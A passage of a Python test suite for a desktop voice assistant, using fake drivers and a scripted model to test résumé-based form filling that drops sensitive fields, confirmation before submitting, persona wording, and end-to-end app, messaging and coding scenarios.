            {"id": 6, "label": "Expected salary", "type": "text", "name": "sal", "required": False, "value": "", "options": []},
            {"id": 7, "label": "Portfolio website", "type": "url", "name": "site", "required": False, "value": "", "options": []},
        ]

    def available(self):
        return True

    def current_url(self):
        return "https://jobs.example.com/apply"

    def form_fields(self):
        return {"url": self.current_url(), "title": "Apply", "fields": self.fields}

    def fill_field(self, fid, value, ftype="text"):
        self.values[fid] = value

    def field_value(self, fid):
        return self.values.get(fid, "")

    def submit_form(self):
        self.submitted = True
        return {"button": "Submit application", "url_before": self.current_url(), "url": self.current_url() + "/done",
                "title": "Thanks", "text": "Thank you for applying! We'll be in touch."}


RESUME = ("Srikanth Mandyam Manadhare\nsrikanth.m@example.com | +91 98765 43210 | linkedin.com/in/srikanth-m\n"
          "Experience: AI intern at Example Labs.\n")


class TestForms(GenesisTestCase):
    def setUp(self):
        def reply(messages, json_mode):
            if "Fill in a form for the user" in messages[-1]["content"]:
                return json.dumps({"fills": [{"id": 1, "value": "Srikanth Mandyam Manadhare"}, {"id": 2, "value": "srikanth.m@example.com"},
                                             {"id": 3, "value": "+91 98765 43210"}, {"id": 4, "value": "linkedin.com/in/srikanth-m"},
                                             {"id": 5, "value": "1999-01-01"},  # sensitive + invented → must be dropped
                                             {"id": 6, "value": "12 LPA"},  # sensitive + invented → dropped
                                             {"id": 7, "value": "https://srikanth.dev"}],  # not in the résumé → dropped
                                   "missing": []})
            return "{}" if json_mode else "OK"

        self.llm = ScriptedLLM(reply)
        super().setUp()
        (self.home / "Documents" / "Srikanth_Resume.txt").write_text(RESUME)
        self.page = FakeFormPage()
        self.svc.browser = self.page

    def test_fill_change_dont_submit_then_submit(self):
        r = self.say("Fill this application using my resume.")
        self.assertEqual(tools_of(r), [("fill_form", "succeeded")])
        self.assertEqual(self.page.values, {1: "Srikanth Mandyam Manadhare", 2: "srikanth.m@example.com", 3: "+91 98765 43210",
                                            4: "linkedin.com/in/srikanth-m"})
        self.assertIn("Date of birth (sensitive", r.text)
        self.assertIn("Portfolio website (not in your data)", r.text)
        self.assertIn("haven't submitted", r.text)
        r = self.say("Don't submit it yet.")
        self.assertIn("won't submit", r.text)
        self.assertFalse(self.page.submitted)
        r = self.say("Actually, change my answer for the phone number to +91 99999 88888.")
        self.assertEqual(tools_of(r), [("form_set_field", "succeeded")])
        self.assertEqual(self.page.values[3], "+91 99999 88888")
        r = self.say("change that question to https://my.site")  # "that" = the field we were just talking about
        self.assertEqual(self.page.values[3], "https://my.site")
        r = self.say("Okay, submit it.")
        self.assertEqual(r.status, "awaiting_confirmation")  # submitting always asks
        self.assertFalse(self.page.submitted)
        r = self.say("yes")
        self.assertTrue(self.page.submitted)
        self.assertIn("received", r.text)

    def test_sensitive_fields_are_refused(self):
        self.say("fill this form using my resume")
        r = self.say("change the date of birth to 1 Jan 1999")
        self.assertIn("sensitive", r.text)
        self.assertNotIn(5, self.page.values)

    def test_offline_fills_only_basic_contact_fields(self):
        self.svc.llm.primary = __import__("genesis.ai.llm.offline", fromlist=["OfflineProvider"]).OfflineProvider()
        r = self.say("fill this form using my resume")
        self.assertEqual(self.page.values.get(2), "srikanth.m@example.com")
        self.assertNotIn(6, self.page.values)
        self.assertIn("offline", r.text)

    def test_required_fields_block_submission(self):
        self.page.fields.append({"id": 8, "label": "Cover letter", "type": "text", "name": "cl", "required": True, "value": "",
                                 "options": []})
        self.say("fill this form using my resume")
        self.say("submit the form")
        r = self.say("yes")
        self.assertIn("required fields are still empty", r.text)
        self.assertFalse(self.page.submitted)


# =====================================================================================
# Voice / persona / LLM diagnosis wording
# =====================================================================================
class TestVoiceAndPersona(unittest.TestCase):
    def test_female_voice_choice(self):
        names = ["Microsoft David Desktop", "Microsoft Zira Desktop", "Microsoft Aria"]
        self.assertEqual(pick_voice(names, "female"), "Microsoft Aria")
        self.assertEqual(pick_voice(["Microsoft David Desktop", "Microsoft Zira Desktop"], "female"), "Microsoft Zira Desktop")
        self.assertEqual(pick_voice(["Voice A", "Voice B"], "female", {"Voice B": "Female"}), "Voice B")
        self.assertIsNone(pick_voice(["Microsoft David Desktop"], "female"))

    def test_persona_style(self):
        from genesis.core import persona

        class S(dict):
            def get(self, k, d=None):
                return super().get(k, d)

        self.assertEqual(persona.styled("Done — Chrome is open.", S()), "Done, Boss — Chrome is open.")
        self.assertEqual(persona.styled("Done — Chrome is open.", S({"persona.address": ""})), "Done — Chrome is open.")
        self.assertTrue(persona.styled("I'm having trouble connecting to my AI model. x", S()).startswith(
            "Boss, I'm having trouble connecting to my AI model"))


# =====================================================================================
# The 25 end-to-end scenarios from the upgrade brief
# =====================================================================================
def brain(messages, json_mode):
    last = messages[-1]["content"]
    if "natural-language-understanding" in last:
        if "flurble" in last:
            return json.dumps({"intent": "unknown", "confidence": 0.3, "entities": {}})
        return json.dumps({"intent": "conversation", "confidence": 0.9, "entities": {}})
    if "planning component" in last:
        return json.dumps({"steps": [], "reply": "I'm not sure how to do that — could you rephrase it?"})
    if "small, complete, working" in last:
        return json.dumps({"name": "reverser", "entry": "main.py", "summary": "reverses a string",
                           "files": [{"path": "main.py", "content": "s = 'genesis'\nprint(s[::-1]\n"}]})
    if "failed when run" in last:
        return json.dumps({"explanation": "added the missing bracket",
                           "files": [{"path": "main.py", "content": "s = 'genesis'\nprint(s[::-1])\n"}]})
    if "Google Colab notebook cell" in last:
        return json.dumps({"code": "print('hi')", "summary": "prints hi"})
    if json_mode:
        return "{}"
    system = messages[0]["content"] if messages and messages[0]["role"] == "system" else ""
    if "what did we just do" in last.lower():
        return "We " + system.split("What's going on right now:")[-1].strip()[:300]
    if "why did it fail" in last.lower() or "why" in last.lower():
        return "It failed because of a syntax error: a missing closing bracket."
    return f"ANSWER: {last}"


class TestScenarios(GenesisTestCase):
    def setUp(self):
        self.llm = ScriptedLLM(brain)
        self.wa = FakeWhatsAppDriver(wa_chats())
        self.whatsapp_drivers = [self.wa]
        self.colab_driver = FakeColabDriver()
        super().setUp()
        self.svc.images.session = FakeImageWeb()

    def test_scenarios_1_to_20(self):
        r = self.say("Hello Genesis.")                                    # 1
        self.assertNotEqual(r.status, "error")
        r = self.say("My name is Srikanth.")                               # 2
        self.assertIn("Srikanth", r.text)
        r = self.say("What's my name?")                                    # 3
        self.assertIn("Srikanth", r.text)
        r = self.say("Open YouTube.")                                      # 4
        self.assertIn("youtube.com", self.urls_opened()[-1])
        r = self.say("Search for Python tutorials.")                       # 5
        self.assertEqual(tools_of(r)[0][0], "youtube_search")
        r = self.say("Play the second one.")                               # 6
        self.assertIn("bbbbbbbbbb2", self.urls_opened()[-1])
        r = self.say("Open VS Code.")                                      # 7
        self.assertTrue(any("Code.exe" in a[1][0] for a in self.backend.actions if a[0] == "launch"))
        r = self.say("Create a Python file.")                              # 8
        self.assertIn(r.status, ("awaiting_input", "awaiting_confirmation", "done"))
        if r.status == "awaiting_input":
            r = self.say("reverse.py")
        r = self.say("Write a program that reverses a string.")            # 9
        if r.status == "awaiting_confirmation":
            r = self.say("yes")
        self.assertIn("siseneg", r.text)  # it ran (after one automatic fix)
        r = self.say("Run it.")                                            # 10
        if r.status == "awaiting_confirmation":
            r = self.say("yes")
        self.assertIn("siseneg", r.text)
        r = self.say("Why did it fail?")                                   # 11
        self.assertNotEqual(r.status, "error")
        r = self.say("Open Google Colab.")                                 # 12
        self.assertTrue(r.text.startswith("Done, Boss"))
        r = self.say("Create a notebook.")                                 # 13
        self.assertIn("notebook", r.text)
        r = self.say("Open WhatsApp.")                                     # 14
        self.assertIn("WhatsApp is open", r.text)
        r = self.say("Draft a message to Rahul.")                          # 15
        self.assertIn("What should the message to Rahul say?", r.text)
        r = self.say("I'll be there in 5 minutes")
        self.assertEqual(self.wa.composer, "I'll be there in 5 minutes.")
        self.assertEqual(self.wa.sent, [])
        r = self.say("Open Gmail.")                                        # 16
        self.assertIn("mail.google.com", self.urls_opened()[-1])
        r = self.say("Draft an email.")                                    # 17
        self.assertEqual(r.status, "awaiting_input")
        r = self.say("cancel")
        r = self.say("Show me a picture of a peacock.")                    # 18
        self.assertEqual(tools_of(r), [("image_search", "succeeded")])
        with mock.patch.object(self.svc.screen, "analyze", side_effect=__import__(
                "genesis.services.screen", fromlist=["ScreenUnavailable"]).ScreenUnavailable("Screen capture needs Pillow")):
            r = self.say("What am I looking at?")                          # 19
        self.assertIn("Pillow", r.text)
        r = self.say("What did we just do?")                               # 20
        self.assertNotEqual(r.status, "error")

    def test_21_invalid_request_recovers_gracefully(self):
        r = self.say("flurble the wibbly sprocket into the quantum toaster")
        self.assertNotEqual(r.status, "error")
        self.assertTrue(r.text)

    def test_22_23_llm_disconnect_and_restore(self):
        from genesis.ai.llm.base import LLMUnavailable

        good = self.svc.llm.primary

        class Down(ScriptedLLM):
            def chat(self, *a, **k):
                raise LLMUnavailable("network", kind="network")

        self.svc.llm.primary = Down()
        self.svc.llm.primary.is_generative = True
        r = self.say("Explain recursion.")
        self.assertIn("Boss, I'm having trouble connecting to my AI model", r.text)
        r = self.say("open notepad")  # local tools keep working
        self.assertEqual(tools_of(r), [("open_application", "succeeded")])
        self.svc.llm.primary = good
        self.svc.llm._down_until = 0
        r = self.say("Explain recursion.")
        self.assertTrue(r.text.startswith("ANSWER:"))

    def test_24_wake_sleep(self):
        self.say("hello")
        self.assertTrue(self.core.session.active)
        r = self.say("go to sleep")
        self.assertEqual(r.ui_action, "sleep")
        self.assertFalse(self.core.session.active)

    def test_25_contextual_follow_ups(self):
        self.say("open whatsapp")
        self.say("show me the latest message from Mom")  # WhatsApp is the topic, so this means WhatsApp
        r = self.say("reply saying on my way")
        self.assertIn("to Mom", r.text)
        self.say("no")
        self.assertEqual(self.wa.sent, [])
        r = self.say("open youtube")
        r = self.say("search for jazz")
        r = self.say("the first one")
        self.assertIn("aaaaaaaaaa1", self.urls_opened()[-1])


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
